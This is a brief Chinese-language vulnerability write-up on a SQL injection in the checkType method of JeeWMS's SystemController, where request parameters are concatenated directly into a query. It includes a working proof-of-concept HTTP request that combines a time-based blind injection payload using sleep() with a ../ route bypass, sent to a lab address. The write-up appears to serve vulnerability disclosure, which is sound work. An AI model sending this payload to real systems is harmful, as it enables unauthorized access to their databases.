`org.jeecgframework.web.system.controller.core.SystemController#checkType`

`checkType`方法中将`request`中的可控参数直接拼接到了`SQL`查询语句中

![image-20250725112847195](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250725112847195.png?imageSlim)

验证`POC`

```http
GET /jeewms/wmsApiController.do/../systemController.do?checkType&param=1'+OR+sleep(0.02)%3D0+AND+'1'='1&code=1&typeGroupCode=1 HTTP/1.1
Host: 192.168.21.128:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![image-20250725112949324](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250725112949324.png?imageSlim)

![image-20250725113015630](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250725113015630.png?imageSlim)

